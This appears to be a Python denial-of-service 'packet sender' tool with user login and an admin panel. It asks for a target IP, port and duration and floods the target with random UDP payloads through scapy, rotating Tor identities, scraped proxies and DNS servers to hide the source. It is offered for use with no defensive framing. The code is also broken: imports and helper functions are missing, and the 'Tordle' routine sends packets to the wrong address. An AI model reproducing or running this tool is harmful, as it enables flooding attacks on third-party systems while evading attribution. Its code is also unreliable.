import random
import time
import socks
import socket
import requests
import asyncio
import dns.resolver
from scapy.all import IP, UDP, Raw, send
from stem import Signal
from stem.control import Controller
from getpass import getpass

# DNS Resolver function to rotate DNS queries
def resolve_dns(domain, dns_servers):
    """Resolve domain using different DNS servers for each request."""
    resolver = dns.resolver.Resolver()
    resolver.nameservers = random.choice(dns_servers)  # Randomly select DNS server
    try:
        answers = resolver.resolve(domain, 'A')  # Perform an A record lookup
        return str(random.choice(answers).address)  # Return a random IP from the DNS response
    except Exception as e:
        print(f"DNS resolution failed for {domain}: {e}")
        return None

# Function to fetch the IP of the onion domain dynamically
def resolve_onion_domain(onion_domain, dns_ips):
    """Resolve .onion domain using multiple DNS IPs."""
    return resolve_dns(onion_domain, dns_ips)

# Rotate proxies dynamically and set them for SOCKS5 usage
def set_proxy(proxy_list):
    """Randomly set a proxy from the proxy list."""
    proxy = random.choice(proxy_list)
    proxy_ip, proxy_port = proxy.split(":")
    socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    socket.socket = socks.socksocket
    print(f"Using proxy: {proxy_ip}:{proxy_port}")

# Tor connection (Setup SOCKS5 proxy to Tor network)
def connect_to_tor():
    """Connect to Tor and set up SOCKS proxy."""
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("Tor connected and new identity requested!")
            return True
    except Exception as e:
        print(f"Failed to connect to Tor: {e}")
        return False

# Send packet via Tor with dynamic .onion domain, DNS, and proxy switching
def send_tordle_packet(target_ip, target_port, duration, proxies, onion_domains, dns_ips):
    """Send a Tor (Tordle) packet via SOCKS proxy, rotating DNS and proxies dynamically."""
    if not connect_to_tor():
        return

    # Set up Tor SOCKS proxy connection
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)  # Tor's SOCKS5 proxy
    socket.socket = socks.socksocket

    sent_count = 0
    start_time = time.time()
    
    while time.time() - start_time < duration:
        # Rotate DNS, .onion domain, and proxies for each packet
        random_onion = random.choice(onion_domains)
        random_dns = random.choice(dns_ips)
        set_proxy(proxies)

        # Resolve the onion domain using DNS
        resolved_ip = resolve_onion_domain(random_onion, dns_ips)
        if resolved_ip is None:
            print(f"Failed to resolve .onion domain: {random_onion}")
            continue
        
        # Create packet
        packet = IP(dst=resolved_ip) / UDP(dport=target_port) / Raw(load=random._urandom(1024))
        
        # Send the packet and update the sent count
        send(packet)
        sent_count += 1
        
        # Show progress for every 10 packets
        if sent_count % 10 == 0:
            print(f"Sent {sent_count} Tor packets! Using proxy: {random.choice(proxies)}, .onion: {random_onion}, DNS server: {random_dns}")
        
        # Perform at least 10 DNS queries for large requests
        for _ in range(10):  # Perform multiple DNS queries per packet
            resolve_dns(random_onion, dns_ips)
        
        time.sleep(0.1)
    
    print(f"Total Tor packets sent: {sent_count}")

# Fetch proxies from multiple sources concurrently
async def fetch_proxies():
    """Fetch a list of SOCKS5 proxies from multiple sources."""
    urls = [
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://www.socks-proxy.net/",
        "https://www.freeproxylists.net/",
        "https://www.sslproxies.org/",
        "https://www.us-proxy.org/"
    ]
    
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_proxies_from_source(url, session) for url in urls]
        results = await asyncio.gather(*tasks)

    proxies = list(set([proxy for result in results for proxy in result if proxy]))
    
    # Save proxies to a file
    with open('proxies.txt', 'w') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")
    print("Proxies saved to proxies.txt.")
    return proxies

# Fetch onion domains from multiple sources
async def fetch_onion_domains():
    """Fetch .onion domains from multiple sources."""
    urls = [
        "http://onion.ws/api/v1/search/?q=site:.onion&limit=100",
        "https://www.dan.me.uk/torlist/",
        "https://www.7t0r.com/",
        "https://dark.fail/",
        "https://www.cryptogist.com/tor-list"
    ]
    
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_onion_domains_from_source(url, session) for url in urls]
        results = await asyncio.gather(*tasks)

    onion_domains = list(set([domain for result in results for domain in result if domain]))
    
    # Save onion domains to a file
    with open('onion_domains.txt', 'w') as f:
        for domain in onion_domains:
            f.write(f"{domain}\n")
    print(".onion domains saved to onion_domains.txt.")
    return onion_domains

# Fetch DNS IPs from multiple sources
async def fetch_dns_ips():
    """Fetch DNS IPs from multiple sources."""
    urls = [
        "https://dns.google/resolve?name=google.com&type=A",
        "https://www.opendns.com/",
        "https://public-dns.info/nameservers.txt",
        "https://www.cloudflare.com/",
        "https://dns.watch/"
    ]
    
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_dns_ips_from_source(url, session) for url in urls]
        results = await asyncio.gather(*tasks)

    dns_ips = list(set([ip for result in results for ip in result if ip]))
    
    # Save DNS IPs to a file
    with open('dns_ips.txt', 'w') as f:
        for ip in dns_ips:
            f.write(f"{ip}\n")
    print("DNS IPs saved to dns_ips.txt.")
    return dns_ips

# Login function with bcrypt
def login():
    """Login using username and password."""
    users_db = load_users()

    username = input("Enter username: ")
    password = getpass("Enter password: ")

    if username in users_db and bcrypt.checkpw(password.encode('utf-8'), users_db[username]):
        print("Login successful!")
        return True
    else:
        print("Invalid credentials. Try again.")
        return False

# Load users and their hashed passwords from a file
def load_users():
    """Load users from the user.txt file into a dictionary."""
    users = {}
    if os.path.exists('user.txt'):
        with open('user.txt', 'r') as file:
            for line in file:
                username, password_hash = line.strip().split(',')
                users[username] = password_hash
    return users

# Admin panel for user management
def admin_panel():
    """Admin panel for user management."""
    print("1. Add User")
    print("2. Delete User")
    print("3. Ban User")
    choice = input("Select admin action: ")

    if choice == "1":
        username = input("Enter username: ")
        password = getpass("Enter password: ")
        add_user(username, password)
    elif choice == "2":
        username = input("Enter username to delete: ")
        delete_user(username)
    elif choice == "3":
        ip = input("Enter IP to ban: ")
        ban_user(ip)

# Add a new user
def add_user(username, password):
    """Add a user to the system."""
    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
    users = load_users()
    users[username] = password_hash
    save_users(users)
    print(f"User {username} added successfully!")

# Delete a user from the system
def delete_user(username):
    """Delete a user from the system."""
    users = load_users()
    if username in users:
        del users[username]
        save_users(users)
        print(f"User {username} deleted successfully!")
    else:
        print(f"User {username} not found.")

# Ban a user based on their IP
def ban_user(ip):
    """Ban a user based on their IP address."""
    print(f"User with IP {ip} has been banned.")

# Save users to the user.txt file
def save_users(users):
    """Save users to the user.txt file."""
    with open('user.txt', 'w') as file:
        for username, password_hash in users.items():
            file.write(f"{username},{password_hash}\n")

# Main function
async def main():
    print("Welcome to the packet sender!")
    
    # Fetch necessary data
    proxies = await fetch_proxies()
    onion_domains = await fetch_onion_domains()
    dns_ips = await fetch_dns_ips()

    # User login
    if login():
        while True:
            print("\n1. Send UDP Packet")
            print("2. Send TCP Packet")
            print("3. Send Tordle Packet")
            print("4. Admin Panel")
            choice = input("Select an option: ")

            if choice == "1":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter duration in seconds: "))
                send_udp_packet(target_ip, target_port, duration)
            elif choice == "2":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter duration in seconds: "))
                send_tcp_packet(target_ip, target_port, duration)
            elif choice == "3":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter duration in seconds: "))
                await send_tordle_packet(target_ip, target_port, duration, proxies, onion_domains, dns_ips)
            elif choice == "4":
                admin_panel()
            else:
                print("Invalid option.")

if __name__ == "__main__":
    asyncio.run(main())
